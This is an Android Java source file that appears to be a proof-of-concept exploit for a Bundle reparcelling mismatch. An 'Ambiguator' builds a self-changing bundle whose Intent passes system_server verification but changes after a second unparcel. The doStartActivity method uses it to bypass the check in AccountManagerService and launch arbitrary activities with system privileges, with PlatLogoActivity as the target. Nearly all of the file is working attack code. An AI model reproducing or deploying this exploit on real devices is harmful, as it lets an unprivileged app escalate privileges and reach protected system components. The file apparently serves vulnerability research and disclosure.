package com.example.ambigousbundle14;

import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.text.SpannableStringBuilder;
import android.view.View;
import android.widget.TextClock;
import android.widget.TextView;
import android.widget.Toast;

import com.samsung.android.content.clipboard.data.SemImageClipData;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ((TextView) findViewById(R.id.text)).setText(
                new SpannableStringBuilder(getText(isUsingLocalClipData() ? R.string.using_local_class : R.string.using_system_class))
                        .append(getText(R.string.hello_world))
        );
    }

    boolean isUsingLocalClipData() {
        try {
            return SemImageClipData.class.getClassLoader() == MainActivity.class.getClassLoader();
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Test Ambiguator in this process
     */
    public void doInProcessTest(View view) throws Exception {
        Bundle bundle;
        // Evildoer part
        {
            Bundle useMe = new Bundle();
            useMe.putParcelable("intent", new Intent("REPLACED"));
            Ambiguator a = new Ambiguator();
            bundle = a.make(useMe);
        }

        // Victim part
        bundle = reparcel(bundle); // Emulate binder call (evil app -> system_server, system_server verifies)
        if (isUsingLocalClipData()) {
            bundle.setClassLoader(SemImageClipData.class.getClassLoader());
        }
        Intent value1 = bundle.getParcelable("intent");
        bundle = reparcel(bundle); // Emulate binder call (system_server -> system app, app uses value)
        Intent value2 = bundle.getParcelable("intent");
        Toast.makeText(this, value1 + "/" + value2, Toast.LENGTH_SHORT).show();
    }

    /**
     * Write bundle to parcel and read it (simulate binder call)
     */
    @SuppressLint("ParcelClassLoader")
    private Bundle reparcel(Bundle source) {
        Parcel p = Parcel.obtain();
        p.writeBundle(source);
        p.setDataPosition(0);
        Bundle copy = p.readBundle();
        p.recycle();
        return copy;
    }

    /**
     * Start activity using system privileges
     *
     * Will use self-changing bundle to bypass check in AccountManagerService
     */
    private void doStartActivity(Intent intent) throws Exception {
        Bundle verifyMe = new Bundle();
        verifyMe.putParcelable(AccountManager.KEY_INTENT, new Intent(this, MainActivity.class));
        Bundle useMe = new Bundle();
        useMe.putParcelable(AccountManager.KEY_INTENT, intent);

        Ambiguator a = new Ambiguator();
        AuthService.addAccountResponse = a.make(useMe);

        startActivity(new Intent()
                .setClassName("android", "android.accounts.ChooseTypeAndAccountActivity")
                .putExtra("allowableAccountTypes", new String[] {"com.example.ambigousbundle14.account"})
        );
    }

    public void doStartPlatLogo(View view) throws Exception {
        doStartActivity(new Intent().setClassName("android", "com.android.internal.app.PlatLogoActivity"));
    }
}
